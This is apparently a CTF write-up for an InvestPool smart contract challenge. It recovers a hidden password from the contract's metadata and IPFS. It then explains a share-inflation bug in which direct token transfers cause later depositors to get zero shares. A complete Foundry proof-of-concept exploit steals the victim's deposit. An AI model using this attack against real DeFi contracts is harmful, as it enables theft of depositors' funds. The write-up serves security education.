# Analysis of the goerli contract
1. The contrat has a function `getPassword()` which returns 5, but it's not the real password.
2. By the hint from Discord, it has something to do with the metadata, the cbor data can be decoded to:
```
{
	"ipfs": h'122054C3E28CDED5E23F5B3EE244C86C623B672D772B268FDC5E76E4FE131E690BEA',
	"solc": h'00060B'
}

```
And google says the ipfs is base58 and a prefix Qm, on this [online base58 encoding site](https://appdevtools.com/base58-encoder-decoder), input the ipfs and I got:

```
base58(hex"122054C3E28CDED5E23F5B3EE244C86C623B672D772B268FDC5E76E4FE131E690BEA")
-> QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V
```
This is the CID, then query this CID:
https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V

The page shows: `j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx`, the real password.

 
# The logic vulnerability
1. The function `tokenToShares` use `token.balenceOf(pool)` to do the calculation. The balance is supposed to increase by calling `deposit()`, the problem is, hacker can call `ERC20.transfer()` to send token to balance, without increasing the `totalShares`.
2. Hence, if hacker `deposit(1 wei)`, and directly transfer all his rest token to pool, even when user `deposit()`, he can't get the share, because `(amount * totalShares) / tokenBalance` is always 0. There's only 1 exception that the user deposit the same amount as the balance, which is 1000 ether.

# POC (Foundry)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/InvestPool.sol";

contract HackInvestPool is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
    }
    function userWithdraw() public {
        vm.prank(user);
        pool.withdrawAll();
    }
    function hackerDeposit(uint amount) public {
        vm.prank(hacker);
        pool.deposit(amount);
    }
    function hackerWithdraw() public {
        vm.prank(hacker);
        pool.withdrawAll();
    }
    function hackerTransferToPool(uint amount) public {
        vm.prank(hacker);
		token.transfer(address(pool), amount);
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);

		vm.startPrank(hacker);
		pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
		vm.stopPrank();


		hackerDeposit(1);
		hackerTransferToPool(1000e18 - 1);

		userDeposit(1000e18 - 1);

		hackerWithdraw();

        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}

```

# Thank you guys very much for these awesome CTF challenges
